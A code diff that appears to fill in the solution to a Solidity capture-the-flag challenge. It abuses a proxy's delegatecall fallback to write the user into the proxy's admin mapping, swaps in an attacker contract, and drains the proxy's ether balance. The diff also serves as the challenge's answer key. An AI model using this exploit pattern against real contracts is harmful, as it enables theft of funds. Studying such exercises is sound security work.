@@ -11,6 +11,9 @@ contract ResolutionScript is Script {
     Proxy internal proxy;
     address internal user;
 
+    event log(uint n);
+    event log(string s);
+
     function setUp() public {
         implementation = new Database();
         proxy = new Proxy(address(implementation));
@@ -29,11 +32,33 @@ contract ResolutionScript is Script {
     }
 
     function solution() internal {
-        // write your solution here !
-        
+        //true extended to bytes32
+        bytes32 b = hex"0000000000000000000000000000000000000000000000000000000000000001";
+
+        //write "user" as admin in Proxy thanks to the delegatecall in the fallback function.
+        //the write actually happens in the _admins mapping in the Proxy contract
+        //as such Proxy is providing the funds sent via "msg.sender.call" i Database.write
+        Database(address(proxy)).write(uint256(uint160(user)), b);
+
+        //set implementation to my own "db"
+        UnreliableExpensiveDB myDB = new UnreliableExpensiveDB();
+        proxy.setImplementation(address(myDB));
+
+        //use the delegatecall to make Proxy pay again, but much more
+        UnreliableExpensiveDB(address(proxy)).whatev();
     }
 
     function isSolved() internal view returns (bool) {
         return address(proxy).balance == 0;
     }
 }
+
+contract UnreliableExpensiveDB
+{
+    function whatev() external {
+        (bool success,) = msg.sender.call{value: 9.99999999e22}("");
+        require(success, "Failed to send Ether");
+    }
+}
+
+
